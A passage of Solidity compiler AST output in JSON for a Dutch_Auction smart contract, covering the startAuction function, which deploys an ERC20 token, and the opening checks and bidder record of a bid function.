6"},"typeName":{"id":1198,"name":"uint256","nodeType":"ElementaryTypeName","src":"3909:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1201,"indexed":false,"mutability":"mutable","name":"totalETHEarned","nameLocation":"3942:14:7","nodeType":"VariableDeclaration","scope":1203,"src":"3937:19:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1200,"name":"uint","nodeType":"ElementaryTypeName","src":"3937:4:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3869:93:7"},"src":"3848:115:7"},{"body":{"id":1273,"nodeType":"Block","src":"4115:632:7","statements":[{"expression":{"id":1219,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1216,"name":"s_auctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1060,"src":"4125:14:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"expression":{"id":1217,"name":"AuctionState","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1057,"src":"4142:12:7","typeDescriptions":{"typeIdentifier":"t_type$_t_enum$_AuctionState_$1057_$","typeString":"type(enum Dutch_Auction.AuctionState)"}},"id":1218,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"4155:4:7","memberName":"OPEN","nodeType":"MemberAccess","referencedDeclaration":1055,"src":"4142:17:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"src":"4125:34:7","typeDescriptions":{"typeIdentifier":"t_enum$_AuctionState_$1057","typeString":"enum Dutch_Auction.AuctionState"}},"id":1220,"nodeType":"ExpressionStatement","src":"4125:34:7"},{"expression":{"id":1223,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1221,"name":"totalAlgosAvailable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1019,"src":"4169:19:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":1222,"name":"_totalAlgosAvailable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1205,"src":"4191:20:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4169:42:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1224,"nodeType":"ExpressionStatement","src":"4169:42:7"},{"expression":{"id":1227,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1225,"name":"changePerMin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1028,"src":"4221:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":1226,"name":"_changePerMin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1207,"src":"4236:13:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4221:28:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1228,"nodeType":"ExpressionStatement","src":"4221:28:7"},{"expression":{"id":1234,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1229,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"4259:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":1232,"name":"startPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1013,"src":"4281:10:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1231,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4274:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":1230,"name":"int256","nodeType":"ElementaryTypeName","src":"4274:6:7","typeDescriptions":{}}},"id":1233,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4274:18:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"src":"4259:33:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"id":1235,"nodeType":"ExpressionStatement","src":"4259:33:7"},{"expression":{"id":1238,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1236,"name":"currentUnsoldAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1026,"src":"4302:18:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":1237,"name":"_totalAlgosAvailable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1205,"src":"4323:20:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4302:41:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1239,"nodeType":"ExpressionStatement","src":"4302:41:7"},{"expression":{"id":1243,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1240,"name":"startTime","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1021,"src":"4353:9:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"expression":{"id":1241,"name":"block","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-4,"src":"4365:5:7","typeDescriptions":{"typeIdentifier":"t_magic_block","typeString":"block"}},"id":1242,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"4371:9:7","memberName":"timestamp","nodeType":"MemberAccess","src":"4365:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4353:27:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1244,"nodeType":"ExpressionStatement","src":"4353:27:7"},{"expression":{"id":1255,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1245,"name":"DAToken","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1034,"src":"4436:7:7","typeDescriptions":{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":1249,"name":"totalAlgosAvailable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1019,"src":"4461:19:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"arguments":[{"id":1252,"name":"this","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-28,"src":"4490:4:7","typeDescriptions":{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_Dutch_Auction_$1950","typeString":"contract Dutch_Auction"}],"id":1251,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4482:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1250,"name":"address","nodeType":"ElementaryTypeName","src":"4482:7:7","typeDescriptions":{}}},"id":1253,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4482:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_address","typeString":"address"}],"id":1248,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"NewExpression","src":"4446:14:7","typeDescriptions":{"typeIdentifier":"t_function_creation_nonpayable$_t_uint256_$_t_address_$returns$_t_contract$_ERC20Token_$2018_$","typeString":"function (uint256,address) returns (contract ERC20Token)"},"typeName":{"id":1247,"nodeType":"UserDefinedTypeName","pathNode":{"id":1246,"name":"ERC20Token","nameLocations":["4450:10:7"],"nodeType":"IdentifierPath","referencedDeclaration":2018,"src":"4450:10:7"},"referencedDeclaration":2018,"src":"4450:10:7","typeDescriptions":{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"}}},"id":1254,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4446:50:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"}},"src":"4436:60:7","typeDescriptions":{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"}},"id":1256,"nodeType":"ExpressionStatement","src":"4436:60:7"},{"expression":{"id":1262,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1257,"name":"ERC20ContractAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1036,"src":"4506:20:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":1260,"name":"DAToken","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1034,"src":"4537:7:7","typeDescriptions":{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"}],"id":1259,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4529:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":1258,"name":"address","nodeType":"ElementaryTypeName","src":"4529:7:7","typeDescriptions":{}}},"id":1261,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4529:16:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"4506:39:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1263,"nodeType":"ExpressionStatement","src":"4506:39:7"},{"eventCall":{"arguments":[{"id":1265,"name":"startTime","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1021,"src":"4591:9:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1266,"name":"ERC20ContractAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1036,"src":"4614:20:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":1267,"name":"totalAlgosAvailable","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1019,"src":"4648:19:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1268,"name":"changePerMin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1028,"src":"4681:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1264,"name":"startAuctionEvent","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1159,"src":"4560:17:7","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_uint256_$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (uint256,address,uint256,uint256)"}},"id":1269,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4560:143:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1270,"nodeType":"EmitStatement","src":"4555:148:7"},{"expression":{"id":1271,"name":"ERC20ContractAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1036,"src":"4720:20:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":1215,"id":1272,"nodeType":"Return","src":"4713:27:7"}]},"functionSelector":"4fee13fc","id":1274,"implemented":true,"kind":"function","modifiers":[{"id":1210,"kind":"modifierInvocation","modifierName":{"id":1209,"name":"onlyOwner","nameLocations":["4073:9:7"],"nodeType":"IdentifierPath","referencedDeclaration":1112,"src":"4073:9:7"},"nodeType":"ModifierInvocation","src":"4073:9:7"},{"id":1212,"kind":"modifierInvocation","modifierName":{"id":1211,"name":"AuctionClosed","nameLocations":["4083:13:7"],"nodeType":"IdentifierPath","referencedDeclaration":1148,"src":"4083:13:7"},"nodeType":"ModifierInvocation","src":"4083:13:7"}],"name":"startAuction","nameLocation":"3978:12:7","nodeType":"FunctionDefinition","parameters":{"id":1208,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1205,"mutability":"mutable","name":"_totalAlgosAvailable","nameLocation":"4008:20:7","nodeType":"VariableDeclaration","scope":1274,"src":"4000:28:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1204,"name":"uint256","nodeType":"ElementaryTypeName","src":"4000:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1207,"mutability":"mutable","name":"_changePerMin","nameLocation":"4046:13:7","nodeType":"VariableDeclaration","scope":1274,"src":"4038:21:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1206,"name":"uint256","nodeType":"ElementaryTypeName","src":"4038:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3990:75:7"},"returnParameters":{"id":1215,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1214,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1274,"src":"4106:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1213,"name":"address","nodeType":"ElementaryTypeName","src":"4106:7:7","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"4105:9:7"},"scope":1950,"src":"3969:778:7","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":1376,"nodeType":"Block","src":"4860:935:7","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1286,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":1283,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"4918:3:7","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":1284,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"4922:5:7","memberName":"value","nodeType":"MemberAccess","src":"4918:9:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":1285,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4930:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"4918:13:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"62696456616c7565206c657373207468616e2030","id":1287,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"4933:22:7","typeDescriptions":{"typeIdentifier":"t_stringliteral_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a","typeString":"literal_string \"bidValue less than 0\""},"value":"bidValue less than 0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a","typeString":"literal_string \"bidValue less than 0\""}],"id":1282,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"4910:7:7","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":1288,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4910:46:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1289,"nodeType":"ExpressionStatement","src":"4910:46:7"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":1290,"name":"calculate","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1767,"src":"4966:9:7","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$__$returns$__$","typeString":"function ()"}},"id":1291,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4966:11:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1292,"nodeType":"ExpressionStatement","src":"4966:11:7"},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1299,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1297,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":1294,"name":"block","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-4,"src":"4995:5:7","typeDescriptions":{"typeIdentifier":"t_magic_block","typeString":"block"}},"id":1295,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"5001:9:7","memberName":"timestamp","nodeType":"MemberAccess","src":"4995:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"id":1296,"name":"startTime","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1021,"src":"5013:9:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4995:27:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":1298,"name":"AUCTION_TIME","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1024,"src":"5025:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4995:42:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"74696d65206973207570","id":1300,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"5039:12:7","typeDescriptions":{"typeIdentifier":"t_stringliteral_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb","typeString":"literal_string \"time is up\""},"value":"time is up"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb","typeString":"literal_string \"time is up\""}],"id":1293,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"4987:7:7","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":1301,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4987:65:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1302,"nodeType":"ExpressionStatement","src":"4987:65:7"},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1306,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1304,"name":"currentUnsoldAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1026,"src":"5070:18:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":1305,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5091:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"5070:22:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"5468657265206973206e6f206d6f726520616c676f73206c656674","id":1307,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"5094:29:7","typeDescriptions":{"typeIdentifier":"t_stringliteral_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3","typeString":"literal_string \"There is no more algos left\""},"value":"There is no more algos left"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3","typeString":"literal_string \"There is no more algos left\""}],"id":1303,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"5062:7:7","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":1308,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5062:62:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1309,"nodeType":"ExpressionStatement","src":"5062:62:7"},{"assignments":[1312],"declarations":[{"constant":false,"id":1312,"mutability":"mutable","name":"newBidder","nameLocation":"5218:9:7","nodeType":"VariableDeclaration","scope":1376,"src":"5203:24:7","stateVariable":false,"storageLocation":"storage","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder"},"typeName":{"id":1311,"nodeType":"UserDefinedTypeName","pathNode":{"id":1310,"name":"Bidder","nameLocations":["5203:6:7"],"nodeType":"IdentifierPath","referencedDeclaration":1054,"src":"5203:6:7"},"referencedDeclaration":1054,"src":"5203:6:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder"}},"visibility":"internal"}],"id":1316,"initialValue":{"baseExpression":{"id":1313,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"5230:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1315,"indexExpression":{"id":1314,"name":"totalNumBidders","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1011,"src":"5242:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"5230:28:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"nodeType":"VariableDeclarationStatement","src":"5203:55:7"},{"expression":{"id":1321,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"id":1317,"name":"newBidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1312,"src":"5268:9:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder storage pointer"}},"id":1319,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"5278:8:7","memberName":"bidderID","nodeType":"MemberAccess","referencedDeclaration":1043,"src":"5268:18:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":1320,"name":"totalNumBidders","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1011,"src":"5289:15:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5268:36:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1322,"nodeType":"ExpressionStatement","src":"5268:36:7"},{"expression":{"id":1328,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"id":1323,"name":"newBidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1312,"src":"5314:9:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder storage pointer"}},"id":1325,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"5324:13:7","memberName":"walletAddress","nodeType":"MemberAccess","referencedDeclaration":1045,"src":"5314:23:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"expression":{"id":1326,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"5340:3:7","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":1327,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"5344:6:7","memberName":"sender","nodeType":"MemberAccess","src":"5340:10:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"5314:36:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":1329,"nodeType":"ExpressionStatement","src":"5314:36:7"},{"expression":{"id":1335,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"id":1330,"name":"newBidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1312,"src":"5360:9:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder storage pointer"}},"id":1332,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"5370:8:7","memberName":"bidValue","nodeType":"MemberAccess","referencedDeclaration":1047,"src":"5360:18:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"expression":{"id":1333,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"5381:3:7","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":1334,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"5385:5:7","memberName":"value","nodeType":"MemberAccess","src":"5381:9:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"5360:30:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1336,"nodeType":"ExpressionStatement","src":"5360:30:7"},{"expression":{"id":1341,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"id":1337,"name":"newBidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1312,"src":"5400:9:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder storage pointer"}},"id":1339,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"5410:7:7","memberName":"isExist","nodeType":"MemberAccess","referencedDeclaration":1053,"src":"5400:17:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"74727565","id":1340,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"5420:4:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},"src":"5400:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1342,"nodeType":"ExpressionStatement","src":"5400:24:7"},{"expression":{"id":1347,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"id":1343,"name":"newBidder","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1312,"src":"5434:9:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder storage 